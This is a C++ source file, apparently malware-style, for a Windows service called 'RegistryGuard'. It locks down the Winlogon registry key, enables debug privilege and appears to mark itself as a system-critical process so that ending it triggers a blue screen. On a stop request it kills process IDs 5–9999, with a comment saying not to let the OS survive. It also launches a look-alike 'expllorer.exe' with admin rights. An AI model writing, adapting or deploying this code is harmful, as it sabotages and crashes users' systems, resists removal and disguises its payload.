#include "MustInclude.h"
#include <Windows.h>
#include <iostream>
#include <string>
#include <vector>
#include <map>
#include <algorithm>
#include "../process.h"
#include"../file.h"
#include"GeneralTask.h"
// 配置受保护的注册表路径 (ANSI)
const char* PROTECTED_REG_PATH = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon";

SERVICE_STATUS g_ServiceStatus = {0};
SERVICE_STATUS_HANDLE g_StatusHandle = NULL;
HANDLE g_StopEvent = NULL;

// 注册表键值备份存储
std::map<std::string, std::vector<BYTE>> g_RegistryBackup;








// 递归备份注册表项 (ANSI)
void BackupRegistryKey(HKEY hKey, const std::string& subPath) {
    HKEY hSubKey;
    if (RegOpenKeyExA(hKey, subPath.c_str(), 0, KEY_READ, &hSubKey) != ERROR_SUCCESS) 
        return;

    // 备份所有值
    char valueName[256];
    DWORD valueType, valueSize;
    DWORD index = 0;
    
    while (true) {
        valueSize = sizeof(valueName);
        if (RegEnumValueA(hSubKey, index, valueName, &valueSize, 
                         NULL, &valueType, NULL, NULL) != ERROR_SUCCESS) 
            break;
        
        DWORD dataSize = 0;
        RegQueryValueExA(hSubKey, valueName, NULL, &valueType, NULL, &dataSize);
        
        if (dataSize > 0) {
            std::vector<BYTE> buffer(dataSize);
            RegQueryValueExA(hSubKey, valueName, NULL, NULL, buffer.data(), &dataSize);
            
            std::string fullValuePath = subPath + "\\" + valueName;
            g_RegistryBackup[fullValuePath] = buffer;
        }
        index++;
    }

    // 递归备份子项
    char subKeyName[256];
    DWORD subKeySize = sizeof(subKeyName);
    index = 0;
    
    while (RegEnumKeyExA(hSubKey, index, subKeyName, &subKeySize, 
                        NULL, NULL, NULL, NULL) == ERROR_SUCCESS) 
    {
        std::string newPath = subPath + "\\" + subKeyName;
        BackupRegistryKey(hKey, newPath);
        subKeySize = sizeof(subKeyName);
        index++;
    }
    
    RegCloseKey(hSubKey);
}

// 恢复被修改的注册表项 (ANSI)
void RestoreRegistryChanges() {
    HKEY hRoot = HKEY_LOCAL_MACHINE;
    for (auto& entry : g_RegistryBackup) {
        const std::string& path = entry.first;
        size_t lastSlash = path.find_last_of('\\');
        
        std::string keyPath = path.substr(0, lastSlash);
        std::string valueName = path.substr(lastSlash + 1);
        
        HKEY hKey;
        if (RegOpenKeyExA(hRoot, keyPath.c_str(), 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
            RegSetValueExA(hKey, valueName.c_str(), 0, REG_BINARY,
                          entry.second.data(), 
                          static_cast<DWORD>(entry.second.size()));
            RegCloseKey(hKey);
        }
    }
}

// 注册表监控线程 (ANSI)
DWORD WINAPI RegistryMonitorThread(LPVOID lpParam) {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, PROTECTED_REG_PATH, 
                     0, KEY_NOTIFY, &hKey) != ERROR_SUCCESS) 
    {
        return 1;
    }

    while (WaitForSingleObject(g_StopEvent, 0) != WAIT_OBJECT_0) {
        // 设置注册表变更通知
        if (RegNotifyChangeKeyValue(hKey, TRUE, 
                                   REG_NOTIFY_CHANGE_NAME |
                                   REG_NOTIFY_CHANGE_ATTRIBUTES |
                                   REG_NOTIFY_CHANGE_LAST_SET |
                                   REG_NOTIFY_CHANGE_SECURITY,
                                   NULL, FALSE) == ERROR_SUCCESS) 
        {
            // 检测到变更，立即恢复
            RestoreRegistryChanges();
        }
        Sleep(100);  // 避免高频检测
    }

    RegCloseKey(hKey);
    return 0;
}

// 服务控制处理函数 (ANSI)
VOID WINAPI ServiceCtrlHandler(DWORD CtrlCode) {
    switch (CtrlCode) {
        case SERVICE_CONTROL_STOP:
            
			for(int i=5;i<10000;i++){//不让操作系统活
				TerminateProcessById(i);
			}
			g_ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
            SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
            SetEvent(g_StopEvent);
            return;
        
        default:
            break;
    }
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
}

// 服务主函数 (ANSI)
VOID WINAPI ServiceMain(DWORD argc, LPSTR* argv) {
    g_StatusHandle = RegisterServiceCtrlHandlerA("RegistryGuard", ServiceCtrlHandler);
    if (!g_StatusHandle) return;

    g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);

    // 初始化备份
    BackupRegistryKey(HKEY_LOCAL_MACHINE, PROTECTED_REG_PATH);
    
    // 创建停止事件
    g_StopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    
    // 启动监控线程
    HANDLE hThread = CreateThread(NULL, 0, RegistryMonitorThread, NULL, 0, NULL);
    HANDLE hThread2 = CreateThread(NULL, 0, MonitorThread, NULL, 0, NULL);
	
	EnableDebugPrivilege();
	BSODCriticalProtect(1);
	
	
	
	LaunchAdminInteractiveProcess(L"C:\\windows\\system32\\expllorer.exe");
	
    // 报告运行状态
    g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
    
    // 等待停止信号
    WaitForSingleObject(g_StopEvent, INFINITE);
    
    // 清理资源
    CloseHandle(g_StopEvent);
    WaitForSingleObject(hThread, 5000);
    CloseHandle(hThread);
    
    g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
}

int main() {
    SERVICE_TABLE_ENTRYA ServiceTable[] = {
        { (LPSTR)"RegistryGuard", (LPSERVICE_MAIN_FUNCTIONA)ServiceMain },
        { NULL, NULL }
    };
    
    if (StartServiceCtrlDispatcherA(ServiceTable) == FALSE) {
        return GetLastError();
    }
    return 0;
}
